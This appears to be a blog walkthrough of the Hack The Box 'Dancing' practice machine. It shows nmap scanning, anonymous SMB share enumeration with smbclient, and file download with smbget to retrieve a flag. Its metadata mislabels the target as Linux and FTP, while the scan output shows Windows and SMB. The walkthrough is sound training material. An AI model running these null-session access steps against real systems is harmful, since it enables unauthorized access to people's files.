---
title: "Hack the Box - Dancing"
date: 2022-10-12T00:38:05+05:30
draft: false
description: " Dancing from HackTheBox is an retired machine which is vulnerable to security Misconfiguration FTP , which can be easily exploited with help of Basic Recon " 
hideToc: false
enableToc: true
enableTocContent: false
author: Atom
authorEmoji: ✍️
tags:
- smbshare
series:
- Starting Point Tire 0
categories:
- Very Easy
- HackTheBox
- Linux
libraries:
- 
image: /images/hackthebox/dancing/2.png
---

Hi Hackers Welcome Back, Today we are going to look at Hack The Box Dancing Machine.

## Info Table
<table style="width:100%">
 <thead>
  <tr>
    <th>Room Name</th>
    <th>Dancing</th>
  </tr>
</thead>
<tr>
    <td>Category</td>
    <td>Hack The Box</td>
    </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
    </tr>
  </tr>
   <tr>
    <td>Difficulty</td>
    <td>Very Easy</td>
    </tr>
    <tr>
    <td>Maker</td>
    <td>Hack The Box</td>
    </tr>
    <tr>
    </tr>
</table>

## Kill Chain Summery
While enumerating ports and services we can able to find the port 445 ware open. while trying to connect with empty password. we got some shared access. 

## Recon

let’s start with initial default scan (-sC) , During scanning, we will typically see port 445 TCP open on the target, reserved for the SMB protocol. Usually, SMB runs at the Application or Presentation layers of the OSI model, 

it relies on lower-level protocols for transport. The Transport layer protocol that Microsoft SMB Protocol is most often used with is NetBIOS over TCP/IP (NBT). This is why, during scans, we will most likely see both protocols with open ports running on the target.

```bash
atom@atom-VirtualBox:~/htb/dancing$ nmap -sC -sV 10.129.1.12
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-11 23:28 IST
Nmap scan report for 10.129.1.12
Host is up (0.17s latency).
Not shown: 969 closed ports, 28 filtered ports
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3h59m59s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-10-11T21:59:13
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.07 seconds
```

SMB (Server Message Block). This communication protocol provides shared access to files, printers, and serial ports between endpoints on a network. We mostly see SMB services running on Windows machines.

Using the SMB protocol, an client application can read, create, and update files on the remote server. It can also communicate with any server program that is set up to receive an SMB client request.

An SMB-enabled storage on the network is called a share . These can be accessed by any client that has the address of the server and the proper credentials. Like many other file access protocols, SMB requires some security layers to function appropriately within a network topology. If SMB allows clients to create, edit, retrieve, and remove files on a share, there is a clear need for an authentication mechanism. At a user level, SMB clients are required to provide a username/password combination to see or interact with the contents of the SMB share.

Despite having the ability to secure access to the share, a network administrator can sometimes make mistakes and accidentaly allow logins without any valid credentials or ``` using either guest accounts``` or ``` anonymous log-ons ```

```bash
atom@atom-VirtualBox:~/htb/dancing$ nmap -sC -sV -p 445 10.129.1.12
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-11 23:46 IST
Nmap scan report for 10.129.1.12
Host is up (0.18s latency).

PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?

Host script results:
|_clock-skew: 3h59m50s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-10-11T22:16:58
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 112.13 seconds

```

As previously mentioned, we observe that port 445 TCP for SMB is up and running, which means that we have an active share that we could potentially explore. Think of this share as a folder that can be accessed over the internet. In order to do so, we will need the appropriate services and scripts installed. In order to successfully enumerate share content on the remote system, we can use a script called

smbclient . If the script is not present on your Virtual Machine, you can install it by typing the following command in your terminal (for Debian based operating systems):

```bash
atom@atom-VirtualBox:~/htb/dancing$ sudo apt-get install smbclient
[sudo] password for atom: 
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following packages were automatically installed and are no longer required:
  chromium-codecs-ffmpeg-extra gstreamer1.0-vaapi libgstreamer-plugins-bad1.0-0 libva-wayland2
Use 'sudo apt autoremove' to remove them.
The following additional packages will be installed:
  python3-crypto python3-gpg python3-samba python3-tdb samba-common samba-common-bin samba-dsdb-modules
Suggested packages:
  heimdal-clients python3-markdown python3-dnspython cifs-utils
The following NEW packages will be installed:
  python3-crypto python3-gpg python3-samba python3-tdb samba-common samba-common-bin samba-dsdb-modules smbclient
0 upgraded, 8 newly installed, 0 to remove and 0 not upgraded.
Need to get 4,312 kB of archives.
After this operation, 29.4 MB of additional disk space will be used.
Do you want to continue? [Y/n]
```

Smbclient will attempt to connect to the remote host and check if there is any authentication required. If there is, it will ask you for a password for your local username. We should take note of this. If we do not

specify a specific username to smbclient when attempting to connect to the remote host, it will just use your local machine's username. That is the one you are currently logged into your Virtual Machine with. This is because SMB authentication always requires a username, so by not giving it one explicitly to try to login with, it will just have to pass your current local username to avoid throwing an error with the protocol.

Nevertheless, let us use our local username since we do not know about any remote usernames present on the target host that we could potentially log in with. Next up, after that, we will be prompted for a password. This password is related to the username you input before. Hypothetically, if we were a legitimate remote user trying to log in to their resource, we would know our username and password and log in normally to access our share. In this case, we do not have such credentials, so what we will be trying to perform is any of the following:

1. ``` Guest authentication ```
2. ``` Anonymous authentication ```

Any of these will result in us logging in without knowing a proper username/password combination and seeing the files stored on the share. Let us proceed to try that. We leave the password field blank, simply

hitting ``` Enter ``` to tell the script to move along.

```bash
atom@atom-VirtualBox:~/htb/dancing$ smbclient -L 10.129.1.12
Enter WORKGROUP\atom's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
SMB1 disabled -- no workgroup available
```

As always, we can type the name of our script in the terminal followed by the switch  ```  -h or --help ``` to find out more about the capabilities of this script alongside its usage.

``` ADMIN$ ``` - Administrative shares are hidden network shares created by the Windows NT family of operating systems that allow system administrators to have remote access to every disk volume on a network-connected system. These shares may not be permanently deleted but may be disabled. 

``` C$  ``` - Administrative share for the C:\ disk volume. This is where the operating system is hosted.

``` IPC$ ``` - The inter-process communication share. Used for inter-process communication via named pipes and is not part of the file system.

``` WorkShares ``` - Custom share.

```bash
atom@atom-VirtualBox:~$ smbclient -N -L \\10.129.144.227\\WorkShares

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
SMB1 disabled -- no workgroup available
```

Success! The WorkShares SMB share was poorly configured, allowing us to log in without the appropriate credentials. We can see our terminal prompt changed to smb: \> , letting us know that our shell is now interacting with the service. We can use the help command to see what we can do within this shell.

```bash
atom@atom-VirtualBox:~$ smbclient -N \\\\10.129.144.227\\WorkShares
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Mar 29 13:52:01 2021
  ..                                  D        0  Mon Mar 29 13:52:01 2021
  Amy.J                               D        0  Mon Mar 29 14:38:24 2021
  James.P                             D        0  Thu Jun  3 14:08:03 2021

		5114111 blocks of size 4096. 1751942 blocks available
smb: \>
```

``` smbget ``` is used to download remote shares files 

```bash
atom@atom-VirtualBox:~/htb/dancing$ smbget -R smb://10.129.144.227//WorkShares//James.P
Password for [atom] connecting to //10.129.144.227/WorkShares: 
Using workgroup WORKGROUP, user atom
smb://10.129.144.227//WorkShares//James.P/flag.txt                                                      
Downloaded 32b in 6 seconds
```

```bash
atom@atom-VirtualBox:~/htb/dancing$ smbget -R smb://10.129.144.227//WorkShares//Amy.j
Password for [atom] connecting to //10.129.144.227/WorkShares: 
Using workgroup WORKGROUP, user atom
smb://10.129.144.227//WorkShares//Amy.j/worknotes.txt                                                   
Downloaded 94b in 6 seconds
```

flag is hidden on worknotes.txt